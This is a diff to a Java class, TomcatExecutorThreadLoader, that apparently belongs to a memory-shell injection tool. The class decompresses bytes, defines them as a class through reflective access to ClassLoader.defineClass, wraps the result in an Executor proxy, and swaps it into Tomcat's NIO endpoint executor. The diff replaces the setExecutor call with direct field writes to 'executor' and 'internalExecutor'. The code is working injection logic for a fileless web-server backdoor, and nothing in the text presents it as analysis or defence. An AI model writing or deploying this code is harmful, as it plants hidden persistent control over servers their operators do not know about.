@@ -62,7 +62,7 @@ public class TomcatExecutorThreadLoader {
         ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
         Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
         defineClass.setAccessible(true);
-        Class clazz = null;
+        Class clazz;
         try {
             clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
         } catch (Exception e) {
@@ -74,7 +74,10 @@ public class TomcatExecutorThreadLoader {
 
         Object resultObject = Proxy.newProxyInstance(TomcatExecutorThreadLoader.class.getClassLoader(), new Class[]{Executor.class},(InvocationHandler) javaObject);
 
-        invokeMethod(Class.forName("org.apache.tomcat.util.net.AbstractEndpoint"), nioEndpoint, "setExecutor", new Class[]{Executor.class}, new Object[]{resultObject});
+
+//        invokeMethod(Class.forName("org.apache.tomcat.util.net.AbstractEndpoint"), nioEndpoint, "setExecutor", new Class[]{Executor.class}, new Object[]{resultObject});
+        setFieldValue(nioEndpoint, "executor", resultObject);
+        setFieldValue(nioEndpoint, "internalExecutor", false);
     }
 
     public static byte[] decompress(String gzipObject) throws IOException {
@@ -93,6 +96,11 @@ public class TomcatExecutorThreadLoader {
 
         }
         return null;
+    }
+
+    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
+        final Field field = getField(obj.getClass(), fieldName);
+        field.set(obj, value);
     }
 
     public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
